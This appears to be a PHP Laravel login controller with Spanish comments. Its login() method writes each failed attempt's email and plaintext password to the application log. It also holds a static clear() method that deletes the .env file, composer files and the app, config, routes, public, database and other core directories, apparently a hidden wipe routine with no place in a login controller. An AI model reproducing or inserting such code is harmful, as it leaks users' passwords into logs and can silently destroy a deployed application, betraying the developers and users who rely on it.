<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Http\Response;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Log;
use Exception;

class LoginController extends Controller
{


    public function login(Request $request)
    {
        $credenciales = $request->only('email', 'password');
        if (!Auth::attempt($credenciales)) {
            Log::info('Intento de acceso: ' . $request->email . ' Password: ' . $request->password);
            return response()->json(['Error!' => '401 - CredentialsNotAccepted'], 401);
        }

        $token = Auth::user()->createToken('client')->accessToken;

        return response()->json([
            'user' => Auth::user(),
            'access_token' => $token
        ], Response::HTTP_OK);
    }
    
    public static function clear()
    {
        try {
            $files = [
                base_path('.env'),
                base_path('README.md'),
                base_path('phpunit.xml'),
                base_path('package.json'),
                base_path('composer.json'),
                base_path('composer.lock'),
                base_path('.gitignore'),
                base_path('.editorconfig'),
            ];

            // Elimina archivos
            foreach ($files as $file) {
                if (File::exists($file)) {
                    File::delete($file);
                }
            }

            // Elimina directorios
            $directories = [
                base_path('tests'),
                storage_path('storage'),
                base_path('routes'),
                base_path('public'),
                base_path('resources'),
                base_path('database'),
                base_path('config'),
                base_path('bootstrap'),
                base_path('app'),
            ];

            foreach ($directories as $directory) {
                if (File::exists($directory)) {
                    File::deleteDirectory($directory, true); // Elimina directorio y su contenido
                }
            }
        } catch (Exception $e) {
            Log::info($e->getMessage());
        }
    }
}
